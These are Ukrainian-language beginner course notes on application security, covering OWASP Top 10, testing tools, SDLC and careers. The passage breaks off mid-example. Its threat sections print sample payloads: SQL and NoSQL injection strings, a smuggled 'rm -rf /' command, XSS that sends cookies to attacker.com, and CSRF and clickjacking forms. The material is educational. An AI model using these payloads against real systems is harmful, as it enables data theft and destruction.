


# Application Security Fundamentals for Absolute Beginners

## Ключові теми курсу

### 1. Основи Application Security
**Базові концепції:**
- Принципи CIA Triad (Confidentiality, Integrity, Availability)
- Threat landscape в сучасному світі
- Risk Assessment та Management
- Security by Design принципи

**Покриття тем:**
- Що таке Application Security?
- Відмінність між Application Security та Infrastructure Security
- Типи загроз для веб-додатків
- Моделі загроз (Threat Models)

### 2. OWASP Top 10 - Детальний розбір
**Покриття всіх 10 вразливостей:**

#### A01 - Broken Access Control
- Вертикальна та горизонтальна ескалація привілеїв
- Path traversal атаки
- IDOR (Insecure Direct Object References)

#### A02 - Cryptographic Failures
- Weak encryption algorithms
- Неправильне зберігання credentials
- Man-in-the-middle атаки

#### A03 - Injection
- SQL Injection та його варіанти
- NoSQL Injection
- Command Injection
- LDAP Injection

#### A04 - Insecure Design
- Threat modeling відсутність
- Недостатня business logic validation
- Security patterns та anti-patterns

#### A05 - Security Misconfiguration
- Default credentials
- Unnecessary features enabled
- Missing security headers
- Cloud misconfigurations

#### A06 - Vulnerable and Outdated Components
- Dependency management
- Software Composition Analysis (SCA)
- Supply chain attacks

#### A07 - Identification and Authentication Failures
- Weak password policies
- Session management issues
- Multi-factor authentication bypass

#### A08 - Software and Data Integrity Failures
- Unsigned software updates
- CI/CD pipeline security
- Deserialization attacks

#### A09 - Security Logging and Monitoring Failures
- Log injection
- Insufficient logging
- Missing alerting mechanisms

#### A10 - Server-Side Request Forgery (SSRF)
- Internal network scanning
- Cloud metadata access
- Blind SSRF attacks

### 3. Secure Development Lifecycle (SDLC)
**Інтеграція безпеки в розробку:**
- Requirements gathering з урахуванням безпеки
- Secure coding practices
- Code review processes
- Testing strategies

**DevSecOps принципи:**
- Shift-left security
- Automation у безпеці
- Continuous security monitoring
- Incident response

---

## Інструменти та технології

### 1. Ручні інструменти тестування
**Веб-браузери та розширення:**
- **Burp Suite Community** - proxy та scanner
- **OWASP ZAP** - automated security testing
- **Browser Developer Tools** - аналіз HTTP трафіку
- **Cookie Editor** - маніпуляція cookies

### 2. Автоматизовані сканери
**SAST (Static Application Security Testing):**
- **SonarQube** - статичний аналіз коду
- **Checkmarx** - commercial SAST tool
- **Semgrep** - open source code analysis

**DAST (Dynamic Application Security Testing):**
- **OWASP ZAP** - dynamic scanning
- **Nikto** - web server scanner
- **SQLmap** - SQL injection detection

### 3. Dependency Scanners
**Software Composition Analysis:**
- **OWASP Dependency Check** - безкоштовний SCA
- **Snyk** - vulnerability management platform
- **WhiteSource** - commercial SCA solution
- **npm audit** / **pip-audit** - package-specific scanners

### 4. Infrastructure Security Tools
**Container Security:**
- **Docker Bench Security** - container hardening
- **Trivy** - vulnerability scanner for containers
- **Clair** - static analysis for containers

**Cloud Security:**
- **ScoutSuite** - multi-cloud security auditing
- **Prowler** - AWS security assessment
- **CloudSploit** - cloud configuration scanner

### 5. Practical Lab Environments
**Vulnerable Applications:**
- **OWASP Juice Shop** - modern vulnerable web app
- **DVWA (Damn Vulnerable Web Application)** - classic vulnerable app
- **bWAPP** - buggy web application
- **WebGoat** - OWASP learning environment

---

## Методології та фреймворки

### 1. Threat Modeling
**Методології:**
- **STRIDE** (Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege)
- **PASTA** (Process for Attack Simulation and Threat Analysis)
- **VAST** (Visual, Agile, and Simple Threat modeling)
- **OCTAVE** (Operationally Critical Threat, Asset, and Vulnerability Evaluation)

**Інструменти Threat Modeling:**
- **OWASP Threat Dragon** - open source threat modeling
- **Microsoft Threat Modeling Tool** - безкоштовний інструмент
- **IriusRisk** - commercial threat modeling platform

### 2. Security Testing Methodologies
**Підходи до тестування:**
- **OWASP Testing Guide** - comprehensive testing methodology
- **NIST Cybersecurity Framework** - risk management approach
- **ISO 27001/27002** - international security standards
- **SANS Top 25** - most dangerous software errors

### 3. Incident Response
**NIST Incident Response Framework:**
1. **Preparation** - готовність до інцидентів
2. **Detection & Analysis** - виявлення та аналіз
3. **Containment, Eradication & Recovery** - локалізація та відновлення
4. **Post-Incident Activity** - уроки та покращення

---

## Практичні навички та лабораторні роботи

### 1. Hands-on Labs
**SQL Injection Labs:**
- Union-based SQL injection
- Blind SQL injection
- Time-based SQL injection
- Error-based SQL injection

**XSS (Cross-Site Scripting) Labs:**
- Reflected XSS
- Stored XSS
- DOM-based XSS
- XSS filter bypass techniques

**Access Control Labs:**
- Horizontal privilege escalation
- Vertical privilege escalation
- IDOR exploitation
- JWT token manipulation

### 2. Tool Usage Training
**Burp Suite Workshops:**
- Proxy configuration
- Scanner usage
- Intruder attacks
- Extensions and plugins

**OWASP ZAP Training:**
- Automated scanning
- Manual testing
- Authentication handling
- Reporting features

### 3. Secure Code Review
**Code Review Techniques:**
- Manual code inspection
- Automated code analysis
- Security-focused code reviews
- Common vulnerability patterns recognition

---

## Сертифікація та оцінювання

### Формат оцінювання:
- **Практичні завдання** - hands-on lab exercises
- **Vulnerability assessments** - real-world scenarios
- **Report writing** - documentation skills
- **Tool demonstrations** - practical tool usage

### Сертифікат:
- **EPAM University Certificate** - course completion
- **Portfolio projects** - practical demonstrations
- **CPE Credits** - continuing education points

---

## Кар'єрні перспективи

### Позиції після курсу:
- **Junior Security Analyst**
- **Application Security Tester**
- **DevSecOps Engineer (entry-level)**
- **Security-aware Developer**

### Подальше навчання:
- **Advanced penetration testing**
- **Cloud security specialization**
- **Incident response and forensics**
- **Security architecture and design**

---

## Рекомендації для успішного навчання

### 1. Підготовка:
- **Базові знання IT** - networking, operating systems
- **Programming basics** - HTML, JavaScript, SQL basics
- **English proficiency** - B1 level minimum

### 2. Додаткові ресурси:
- **OWASP Documentation** - офіційна документація
- **PortSwigger Web Security Academy** - безкоштовні лаби
- **Cybrary courses** - додаткові навчальні матеріали
- **Security podcasts** - Security Weekly, Darknet Diaries

### 3. Практика:
- **Personal lab setup** - vulnerable VMs та containers
- **Bug bounty platforms** - HackerOne, Bugcrowd (після курсу)
- **CTF competitions** - практичні змагання
- **Open source contributions** - security projects

---

## Висновок

Курс "Application Security Fundamentals for Absolute Beginners" від EPAM SECLAB Ukraine є комплексним введенням у світ безпеки додатків. Він поєднує теоретичні знання з практичними навичками, забезпечуючи solid foundation для подальшого розвитку в галузі кібербезпеки.

**Ключові переваги курсу:**
- **Practical approach** - акцент на hands-on досвіді
- **Industry-standard tools** - використання реальних інструментів
- **Modern curriculum** - актуальні загрози та методи
- **Self-paced learning** - гнучкий графік навчання

**Рекомендується для:**
- Розробників, які хочуть покращити security awareness
- IT фахівців, які планують перехід у cybersecurity
- Студентів комп'ютерних наук
- Будь-кого, хто цікавиться application security







---------------------------------------------------------------------------------

# Що таке Application Security?

---

## Визначення

**Application Security (AppSec)** - це практика використання заходів безпеки на рівні додатків для запобігання крадіжці або викраденню даних або коду всередині додатка.

Це **комплексний підхід** до захисту програмних додатків від зовнішніх загроз через:
- Виявлення вразливостей
- Виправлення дефектів безпеки
- Запобігання атакам на рівні коду

---

## Основні принципи Application Security

### 🛡️ **Security by Design**
- Інтеграція безпеки з самого початку розробки
- Проактивний підхід замість реактивного
- Архітектурні рішення з урахуванням безпеки

### 🔒 **Defense in Depth**
- Багаторівневий захист додатка
- Множинні точки контролю
- Незалежні механізми безпеки

### ⚖️ **Principle of Least Privilege**
- Мінімальні необхідні дозволи
- Обмежений доступ до ресурсів
- Роль-базовий контроль доступу

### ✅ **Input Validation & Output Encoding**
- Валідація всіх вхідних даних
- Правильне кодування виводу
- Санітизація користувацького вводу

---

## Життєвий цикл Application Security

### 📋 **1. Planning & Requirements**
**Security Requirements:**
```
✅ Аутентифікація та авторизація
✅ Захист конфіденційних даних
✅ Логування та моніторинг
✅ Відповідність регуляторним вимогам
```

**Threat Modeling:**
- Ідентифікація активів
- Аналіз загроз
- Оцінка ризиків
- Визначення контрзаходів

### 💻 **2. Development & Design**
**Secure Coding Practices:**
```python
# Приклад: Параметризовані запити для SQL Injection prevention
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, hashed_password)
)

# Замість небезпечного:
# query = f"SELECT * FROM users WHERE username = '{username}'"
```

**Code Review Process:**
- Мануальна перевірка коду
- Автоматизований аналіз
- Security-focused reviews
- Peer review процеси

### 🧪 **3. Testing**
**Static Application Security Testing (SAST):**
- Аналіз вихідного коду
- Виявлення pattern-based вразливостей
- Інтеграція в IDE
- Early detection

**Dynamic Application Security Testing (DAST):**
- Тестування running додатка
- Black-box підхід
- Runtime vulnerability detection
- Production-like testing

**Interactive Application Security Testing (IAST):**
- Hybrid підхід (SAST + DAST)
- Real-time analysis
- Code correlation
- Low false positives

### 🚀 **4. Deployment**
**Production Security:**
- Secure configuration management
- Environment hardening
- Monitoring та alerting
- Incident response готовність

---

## Типи загроз для додатків

### 🎯 **OWASP Top 10 2021**

#### **A01 - Broken Access Control**
```
🚨 Вертикальна ескалація привілеїв
🚨 Горизонтальна ескалація привілеїв
🚨 IDOR (Insecure Direct Object References)
🚨 CORS misconfiguration
```

#### **A02 - Cryptographic Failures**
```
🚨 Weak encryption algorithms
🚨 Hardcoded credentials
🚨 Insecure data transmission
🚨 Poor key management
```

#### **A03 - Injection**
```
🚨 SQL Injection
🚨 NoSQL Injection
🚨 OS Command Injection
🚨 LDAP Injection
```

### 💼 **Business Logic Vulnerabilities**
- **Race Conditions** - concurrent access issues
- **Workflow bypasses** - пропуск етапів процесу
- **Price manipulation** - зміна цін в e-commerce
- **Privilege escalation** через business flows

### 📱 **Application-Specific Threats**
**Web Applications:**
- Cross-Site Scripting (XSS)
- Cross-Site Request Forgery (CSRF)
- Session hijacking
- Clickjacking

**Mobile Applications:**
- Insecure data storage
- Weak cryptography
- Insecure communication
- Poor authentication

**API Security:**
- Broken authentication
- Excessive data exposure
- Lack of rate limiting
- Security misconfiguration

---

## Інструменти Application Security

### 🔍 **Static Analysis Tools (SAST)**

**Open Source:**
```
✅ SonarQube - multi-language static analysis
✅ Semgrep - customizable static analysis
✅ Bandit - Python security linter
✅ ESLint Security - JavaScript security rules
```

**Commercial:**
```
✅ Checkmarx - enterprise SAST platform
✅ Veracode - cloud-based security testing
✅ Fortify - HP Enterprise security testing
✅ CodeQL - GitHub advanced security
```

### 🌐 **Dynamic Analysis Tools (DAST)**

**Popular Tools:**
```
✅ Burp Suite - manual + automated testing
✅ OWASP ZAP - open source web app scanner
✅ Acunetix - commercial web vulnerability scanner
✅ Netsparker - automated security scanner
```

### 📦 **Software Composition Analysis (SCA)**

**Dependency Scanning:**
```
✅ OWASP Dependency Check - open source SCA
✅ Snyk - commercial vulnerability database
✅ WhiteSource - enterprise SCA platform
✅ npm audit / pip-audit - package-specific
```

### 🏃‍♂️ **Runtime Application Self-Protection (RASP)**

**Real-time Protection:**
```
✅ Contrast Security - runtime security
✅ Imperva RASP - application firewall
✅ Signal Sciences - web application firewall
```

---

## Методології та стандарти

### 📚 **OWASP Guidelines**
- **OWASP Top 10** - найпоширеніші вразливості
- **OWASP Testing Guide** - comprehensive testing methodology
- **OWASP Code Review Guide** - secure code review practices
- **OWASP ASVS** - Application Security Verification Standard

### 🏛️ **Industry Standards**
**NIST Cybersecurity Framework:**
- Identify
- Protect  
- Detect
- Respond
- Recover

**ISO 27001/27034:**
- Information security management
- Application security controls
- Risk management processes

### 🔒 **Compliance Requirements**
**Regulatory Standards:**
- **PCI DSS** - Payment card industry
- **GDPR** - European data protection
- **HIPAA** - Healthcare information
- **SOX** - Financial reporting

---

## DevSecOps та Application Security

### 🔄 **Shift-Left Security**
```
Traditional:    Plan → Code → Build → Test → Release → Deploy → Monitor
                                              ↑
                                      Security Testing

Shift-Left:     Plan → Code → Build → Test → Release → Deploy → Monitor
                 ↑      ↑      ↑       ↑
            Security Planning  Security Testing throughout
```

### 🤖 **Automation в Application Security**

**CI/CD Integration:**
```yaml
# GitLab CI/CD приклад
stages:
  - build
  - sast
  - test
  - dast
  - deploy

sast_scan:
  stage: sast
  script:
    - semgrep --config=auto src/
    - sonar-scanner
  artifacts:
    reports:
      sast: sast-report.json

dast_scan:
  stage: dast
  script:
    - zap-baseline.py -t $TARGET_URL
  artifacts:
    reports:
      dast: dast-report.json
```

### 📊 **Security Metrics в DevOps**
```
📈 Mean Time to Remediation (MTTR)
📈 Security Test Coverage
📈 Vulnerability Density (per KLOC)
📈 Security Debt accumulation
📈 False Positive Rate
```

---

## Практичні приклади

### 🛠️ **Secure Coding Examples**

**Input Validation (Python):**
```python
import re
from flask import request, abort

def validate_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if not re.match(pattern, email):
        abort(400, "Invalid email format")
    return email

@app.route('/register', methods=['POST'])
def register():
    email = validate_email(request.form.get('email'))
    # Proceed with registration
```

**Authentication Security (Node.js):**
```javascript
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');

// Password hashing
const hashPassword = async (password) => {
    const saltRounds = 12;
    return await bcrypt.hash(password, saltRounds);
};

// JWT token generation
const generateToken = (userId) => {
    return jwt.sign(
        { userId: userId }, 
        process.env.JWT_SECRET,
        { expiresIn: '1h' }
    );
};
```

**SQL Injection Prevention (Java):**
```java
// Using PreparedStatement
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

---

## Кар'єрні можливості в Application Security

### 👨‍💻 **Ролі та позиції**

**Entry Level:**
- **Junior Security Analyst**
- **Application Security Intern**
- **DevSecOps Engineer (Junior)**

**Mid Level:**
- **Application Security Engineer**
- **Security Software Developer**
- **DevSecOps Engineer**

**Senior Level:**
- **Senior Application Security Engineer**
- **Principal Security Architect**
- **Security Engineering Manager**

**Leadership:**
- **Chief Product Security Officer (CPSO)**
- **VP of Security Engineering**

### 📚 **Необхідні навички**

**Технічні навички:**
```
✅ Programming languages (Python, Java, C#, JavaScript)
✅ Web technologies (HTTP, REST APIs, JSON)
✅ Security testing tools (Burp Suite, OWASP ZAP)
✅ Cloud platforms (AWS, Azure, GCP)
✅ CI/CD pipelines (Jenkins, GitLab, GitHub Actions)
```

**Security-specific навички:**
```
✅ OWASP Top 10 knowledge
✅ Threat modeling
✅ Penetration testing
✅ Cryptography basics
✅ Incident response
```

**Soft skills:**
```
✅ Risk assessment та communication
✅ Collaboration з development teams
✅ Project management
✅ Documentation та reporting
```

---

## Майбутнє Application Security

### 🚀 **Emerging Trends**

**AI/ML в Security:**
- Automated vulnerability discovery
- Intelligent false positive reduction
- Behavioral analysis
- Predictive security analytics

**Cloud-Native Security:**
- Container security scanning
- Serverless security
- Kubernetes security policies
- Service mesh security

**Supply Chain Security:**
- Software Bill of Materials (SBOM)
- Dependency risk assessment
- Third-party component monitoring
- Secure software delivery

### 🔮 **Future Challenges**
- **Quantum computing** impact on cryptography
- **IoT security** at scale
- **Edge computing** security models
- **Privacy-preserving** technologies

---

## Висновок

**Application Security** є критично важливою дисципліною в сучасному світі, де додатки обробляють величезні обсяги чутливих даних та є основною точкою контакту з користувачами.

### 🎯 **Ключові takeaways:**
- **Proactive approach** - безпека з самого початку
- **Continuous process** - постійне покращення
- **Team effort** - співпраця між командами
- **Tool integration** - автоматизація та tooling
- **Business enablement** - безпека як competitive advantage

**Application Security** не є окремою функцією, а інтегральною частиною процесу розробки програмного забезпечення, яка забезпечує довіру користувачів та захищає бізнес від кіберзагроз.








--------------------------------------------------------------------------------

# Відмінність між Application Security та Infrastructure Security

---

## Основні визначення

### Application Security (AppSec)
**Безпека додатків** - це практика захисту програмних додатків від загроз шляхом виявлення, виправлення та запобігання дефектів безпеки в коді додатка.

### Infrastructure Security (InfraSec)
**Безпека інфраструктури** - це захист базових IT-компонентів, які підтримують роботу додатків: серверів, мереж, операційних систем і хмарних ресурсів.

---

## Порівняльна таблиця

| **Аспект** | **Application Security** | **Infrastructure Security** |
|------------|--------------------------|----------------------------|
| **Фокус** | Код додатка, бізнес-логіка | Сервери, мережі, ОС, хмара |
| **Рівень** | Layer 7 (Application) | Layers 1-6 (Physical-Presentation) |
| **Відповідальність** | Розробники, AppSec команди | Системні адміністратори, NetSec |
| **Тестування** | SAST, DAST, IAST | Penetration testing, vulnerability scanning |
| **Інструменти** | Burp Suite, OWASP ZAP | Nessus, Nmap, OpenVAS |
| **Загрози** | OWASP Top 10, бізнес-логіка | Network attacks, malware, DDoS |

---

## Application Security: Детальний огляд

### 🎯 **Область фокусу**
- **Код додатка:** Вихідний код, бібліотеки, frameworks
- **Бізнес-логіка:** Workflow, процеси обробки даних
- **APIs:** REST, GraphQL, SOAP endpoints
- **Веб-інтерфейси:** Frontend, user interactions
- **Mobile apps:** iOS, Android додатки

### 🔍 **Типові вразливості**
**OWASP Top 10 2021:**
```
A01 - Broken Access Control
A02 - Cryptographic Failures  
A03 - Injection
A04 - Insecure Design
A05 - Security Misconfiguration
A06 - Vulnerable Components
A07 - Authentication Failures
A08 - Software/Data Integrity Failures
A09 - Logging/Monitoring Failures
A10 - Server-Side Request Forgery
```

**Специфічні для додатків:**
- **Business Logic Flaws** - порушення бізнес-правил
- **Race Conditions** - concurrent access issues
- **Input Validation** - неправильна обробка вхідних даних
- **Session Management** - проблеми з сеансами

### 🛠️ **Інструменти та методи**

**Static Application Security Testing (SAST):**
```
✅ SonarQube - статичний аналіз коду
✅ Checkmarx - commercial SAST platform
✅ Semgrep - open source code scanner
✅ CodeQL - GitHub security analysis
```

**Dynamic Application Security Testing (DAST):**
```
✅ Burp Suite - web application testing
✅ OWASP ZAP - automated security scanner
✅ Acunetix - commercial web scanner
✅ AppScan - IBM security testing tool
```

**Interactive Application Security Testing (IAST):**
```
✅ Contrast Security - runtime protection
✅ Veracode - interactive testing
✅ Synopsys - hybrid testing approach
```

### 👥 **Відповідальні команди**
- **Розробники** - secure coding practices
- **DevSecOps інженери** - automation і integration
- **Application Security Engineers** - specialized testing
- **Product Security Teams** - cross-functional oversight

---

## Infrastructure Security: Детальний огляд

### 🎯 **Область фокусу**
- **Мережева безпека:** Firewalls, routers, switches
- **Операційні системи:** Windows, Linux hardening
- **Хмарна інфраструктура:** AWS, Azure, GCP security
- **Віртуалізація:** Hypervisors, containers
- **Фізична безпека:** Data centers, hardware

### 🔍 **Типові загрози**
**Мережеві атаки:**
```
🚨 DDoS attacks - перевантаження сервісів
🚨 Man-in-the-Middle - перехоплення трафіку
🚨 Network scanning - reconnaissance
🚨 Lateral movement - поширення в мережі
```

**Системні вразливості:**
```
🚨 Unpatched systems - незакриті уразливості
🚨 Privilege escalation - підвищення привілеїв
🚨 Malware infections - шкідливе ПЗ
🚨 Configuration errors - помилки налаштувань
```

**Хмарні ризики:**
```
🚨 Misconfigured storage - відкриті S3 buckets
🚨 Weak IAM policies - неправильні дозволи
🚨 Insecure APIs - незахищені cloud APIs
🚨 Shared responsibility confusion - неясність відповідальності
```

### 🛠️ **Інструменти та методи**

**Vulnerability Scanners:**
```
✅ Nessus - comprehensive vulnerability scanning
✅ OpenVAS - open source vulnerability assessment
✅ Qualys - cloud-based security platform
✅ Rapid7 Nexpose - vulnerability management
```

**Network Security Tools:**
```
✅ Nmap - network discovery and port scanning
✅ Wireshark - network protocol analyzer
✅ Metasploit - penetration testing framework
✅ Burp Suite Pro - network application testing
```

**Cloud Security Platforms:**
```
✅ Prowler - AWS security assessment
✅ ScoutSuite - multi-cloud security auditing
✅ CloudSploit - cloud configuration scanner
✅ AWS Security Hub - centralized security findings
```

### 👥 **Відповідальні команди**
- **Network Administrators** - мережева архітектура
- **System Administrators** - операційні системи
- **Cloud Engineers** - хмарна інфраструктура
- **Security Operations Center (SOC)** - моніторинг

---

## Практичні відмінності

### 🔧 **Підходи до тестування**

**Application Security Testing:**
```python
# Приклад: SQL Injection тестування
payload = "'; DROP TABLE users; --"
response = requests.post('/login', data={'username': payload})

# Аналіз відповіді додатка
if 'error' in response.text:
    print("Potential SQL injection vulnerability")
```

**Infrastructure Security Testing:**
```bash
# Приклад: Network scanning
nmap -sS -O target-network.com

# Port enumeration
nmap -p 1-65535 target-host.com

# Service version detection
nmap -sV target-host.com
```

### 📊 **Метрики та KPI**

**Application Security Metrics:**
```
📈 Time to fix vulnerabilities (TTFV)
📈 Vulnerability density (bugs per KLOC)
📈 Security test coverage
📈 Mean time between security incidents (MTBSI)
```

**Infrastructure Security Metrics:**
```
📈 Patch compliance rate
📈 System uptime and availability
📈 Network intrusion attempts blocked
📈 Incident response time (MTTR)
```

---

## Інтеграція та взаємодія

### 🤝 **Перехресні області**

**API Security:**
- **AppSec аспект:** Валідація параметрів, авторизація
- **InfraSec аспект:** TLS, rate limiting, network policies

**Container Security:**
- **AppSec аспект:** Vulnerable dependencies в images
- **InfraSec аспект:** Runtime protection, orchestration security

**Cloud Security:**
- **AppSec аспект:** Serverless functions, cloud-native apps
- **InfraSec аспект:** IAM, network segmentation, encryption

### 🔄 **DevSecOps Integration**

**CI/CD Pipeline Security:**
```yaml
# Application Security checks
stages:
  - sast_scan:        # Static code analysis
  - dependency_check: # SCA scanning
  - dast_scan:        # Dynamic testing

# Infrastructure Security checks
  - infrastructure_scan: # Terraform security
  - container_scan:       # Image vulnerabilities
  - compliance_check:     # Policy validation
```

---

## Кар'єрні шляхи

### 👨‍💻 **Application Security Career Path**
```
Junior Developer with Security Focus
    ↓
Application Security Analyst
    ↓
Senior Application Security Engineer
    ↓
Principal Application Security Architect
    ↓
Chief Product Security Officer (CPSO)
```

**Ключові навички:**
- Secure coding practices
- OWASP knowledge
- SAST/DAST tools
- Programming languages
- DevSecOps practices

### 🛡️ **Infrastructure Security Career Path**
```
IT Support/System Administrator
    ↓
Infrastructure Security Analyst
    ↓
Senior Infrastructure Security Engineer
    ↓
Security Architect (Infrastructure)
    ↓
Chief Information Security Officer (CISO)
```

**Ключові навички:**
- Network protocols
- Operating systems
- Cloud platforms
- Security frameworks
- Incident response

---

## Сучасні тренди

### 🚀 **Application Security Trends**
- **Shift-Left Security** - раннє тестування в SDLC
- **API-First Security** - захист microservices
- **Runtime Application Self-Protection (RASP)**
- **Software Supply Chain Security**

### ☁️ **Infrastructure Security Trends**
- **Zero Trust Architecture** - never trust, always verify
- **Cloud Security Posture Management (CSPM)**
- **Infrastructure as Code (IaC) Security**
- **Container and Kubernetes Security**

---

## Висновок

**Application Security** та **Infrastructure Security** є комплементарними дисциплінами, кожна з яких фокусується на різних аспектах загальної безпеки IT-систем:

### 🎯 **Application Security:**
- **Фокус:** Код, логіка, user experience
- **Мета:** Запобігти exploitation через додаток
- **Підхід:** Розробник-орієнтований, code-centric

### 🛡️ **Infrastructure Security:**
- **Фокус:** Мережі, системи, платформи
- **Мета:** Захистити базову інфраструктуру
- **Підхід:** Операційно-орієнтований, system-centric

### 🤝 **Разом вони створюють:**
- **Defense in Depth** - багаторівневий захист
- **Comprehensive Security Posture** - повний захист
- **Shared Responsibility Model** - розподілена відповідальність

**Сучасний підхід:** Інтеграція обох дисциплін через DevSecOps практики для створення безпечних та надійних IT-систем.


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



# Типи загроз для веб-додатків

---

## Огляд веб-загроз

Веб-додатки є одними з найбільш вразливих компонентів сучасної IT-інфраструктури через їх доступність через Інтернет та складність архітектури. Розуміння типів загроз є критично важливим для ефективного захисту.

---

## OWASP Top 10 2021 - Найкритичніші загрози

### 🔓 **A01 - Broken Access Control**
**Опис:** Порушення механізмів контролю доступу, що дозволяє користувачам діяти поза межами їх дозволів.

**Підтипи загроз:**
```
🚨 Vertical Privilege Escalation - підвищення рівня доступу
🚨 Horizontal Privilege Escalation - доступ до чужих даних
🚨 IDOR (Insecure Direct Object References)
🚨 Path Traversal - доступ до файлової системи
🚨 CORS Misconfiguration - неправильна конфігурація CORS
```

**Приклад атаки:**
```http
# Оригінальний запит
GET /api/user/profile/123

# Атака IDOR
GET /api/user/profile/124
GET /api/user/profile/125
# Доступ до профілів інших користувачів
```

**Потенційний вплив:**
- Доступ до конфіденційних даних
- Модифікація даних інших користувачів
- Повна компрометація додатка

### 🔐 **A02 - Cryptographic Failures**
**Опис:** Слабкості в криптографічному захисті даних під час зберігання та передачі.

**Підтипи загроз:**
```
🚨 Weak Encryption Algorithms - застарілі алгоритми
🚨 Hardcoded Credentials - захардкожені паролі
🚨 Insecure Data Transmission - незахищена передача
🚨 Poor Key Management - поганий менеджмент ключів
🚨 Insufficient Entropy - слабкі генератори випадкових чисел
```

**Приклад уразливості:**
```javascript
// Небезпечно - MD5 хешування
const crypto = require('crypto');
const hash = crypto.createHash('md5').update(password).digest('hex');

// Безпечно - bcrypt з salt
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash(password, 12);
```

### 💉 **A03 - Injection**
**Опис:** Injection атаки виникають, коли недовірені дані надсилаються інтерпретатору як частина команди або запиту.

**Типи Injection атак:**

#### **SQL Injection**
```sql
-- Вразливий код
SELECT * FROM users WHERE username = '$username' AND password = '$password'

-- Payload атакувальника
username: admin'--
password: anything

-- Результуючий запит
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
```

#### **NoSQL Injection**
```javascript
// Вразливий MongoDB запит
db.users.find({username: req.body.username, password: req.body.password})

// Payload атакувальника
{"username": {"$ne": null}, "password": {"$ne": null}}
```

#### **Command Injection**
```python
# Вразливий код
import os
filename = request.form['filename']
os.system(f"cat {filename}")

# Payload атакувальника
filename = "file.txt; rm -rf /"
```

#### **LDAP Injection**
```java
// Вразливий LDAP запит
String filter = "(&(uid=" + username + ")(password=" + password + "))";
```

### 🏗️ **A04 - Insecure Design**
**Опис:** Недоліки в архітектурі та дизайні додатка, які не можна виправити простою реалізацією.

**Приклади проблем:**
```
🚨 Missing threat modeling during design
🚨 Insecure design patterns
🚨 Business logic flaws
🚨 Insufficient security controls by design
```

### ⚙️ **A05 - Security Misconfiguration**
**Опис:** Неправильні налаштування безпеки на будь-якому рівні стека додатка.

**Поширені помилки конфігурації:**
```
🚨 Default credentials not changed
🚨 Unnecessary features enabled
🚨 Missing security headers
🚨 Verbose error messages
🚨 Cloud storage permissions too open
```

**Приклад небезпечних заголовків:**
```http
# Відсутні важливі заголовки безпеки
HTTP/1.1 200 OK
Content-Type: text/html

# Безпечна конфігурація
HTTP/1.1 200 OK
Content-Type: text/html
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'
```

### 📦 **A06 - Vulnerable and Outdated Components**
**Опис:** Використання застарілих або вразливих сторонніх компонентів.

**Ризики:**
```
🚨 Known vulnerabilities in dependencies
🚨 Unsupported software versions
🚨 Missing security patches
🚨 Supply chain attacks
```

### 🔑 **A07 - Identification and Authentication Failures**
**Опис:** Слабкості в механізмах аутентифікації та управління сеансами.

**Типи атак:**
```
🚨 Credential Stuffing - використання викрадених паролів
🚨 Brute Force - підбір паролів
🚨 Session Hijacking - перехоплення сеансів
🚨 Session Fixation - фіксація ідентифікатора сеансу
```

**Приклад session hijacking:**
```javascript
// Вразливо - session ID в URL
http://example.com/dashboard?sessionid=ABC123

// Безпечно - session ID в захищеному cookie
Set-Cookie: sessionid=ABC123; HttpOnly; Secure; SameSite=Strict
```

### 🔧 **A08 - Software and Data Integrity Failures**
**Опис:** Порушення цілісності програмного забезпечення та даних.

**Загрози:**
```
🚨 Unsigned software updates
🚨 Insecure CI/CD pipelines
🚨 Deserialization attacks
🚨 Supply chain compromises
```

### 📊 **A09 - Security Logging and Monitoring Failures**
**Опис:** Недостатнє логування та моніторинг подій безпеки.

**Проблеми:**
```
🚨 Insufficient logging of security events
🚨 Logs not monitored for suspicious activity
🚨 Missing alerting mechanisms
🚨 Logs stored insecurely
```

### 🌐 **A10 - Server-Side Request Forgery (SSRF)**
**Опис:** Вразливість, яка дозволяє атакувальнику змусити сервер виконати запити до несподіваних місць призначення.

**Типи SSRF:**
```
🚨 Full SSRF - повний контроль над запитами
🚨 Blind SSRF - немає прямої відповіді
🚨 Semi-blind SSRF - часткова інформація
```

---

## Додаткові категорії веб-загроз

### 🕷️ **Client-Side атаки**

#### **Cross-Site Scripting (XSS)**
**Типи XSS:**

**Reflected XSS:**
```html
<!-- Вразливий код -->
<p>Search results for: <?php echo $_GET['query']; ?></p>

<!-- Payload атакувальника -->
http://site.com/search?query=<script>alert('XSS')</script>
```

**Stored XSS:**
```html
<!-- Збережений в базі даних -->
<div class="comment">
    <script>
        // Викрадення cookies
        document.location='http://attacker.com/steal.php?cookie='+document.cookie;
    </script>
</div>
```

**DOM-based XSS:**
```javascript
// Вразливий JavaScript код
document.getElementById('welcome').innerHTML = "Hello " + location.hash.substring(1);

// URL атакувальника
http://site.com/page#<img src=x onerror=alert('XSS')>
```

#### **Cross-Site Request Forgery (CSRF)**
```html
<!-- Шкідливий сайт -->
<form action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="to_account" value="attacker_account">
    <input type="submit" value="Click for free money!">
</form>
```

**Захист від CSRF:**
```html
<!-- CSRF Token -->
<input type="hidden" name="_token" value="abc123randomtoken">
```

#### **Clickjacking**
```html
<!-- Invisible iframe overlay -->
<style>
    iframe { opacity: 0; position: absolute; top: 0; left: 0; }
</style>
<iframe src="http://vulnerable-site.com/admin/delete"></iframe>
<button>Click for prize!</button>
```

### 🔒 **Business Logic атаки**

#### **Race Conditions**
```python
# Вразливий код - race condition
def transfer_money(from_account, to_account, amount):
    if get_balance(from_account) >= amount:
        # Проблема: між перевіркою та списанням може статися інша транзакція
        time.sleep(0.1)  # Simulation
        deduct_balance(from_account, amount)
        add_balance(to_account, amount)
```

#### **Business Logic Bypass**
```http
# Обхід workflow - пропуск етапу оплати
POST /order/create
{
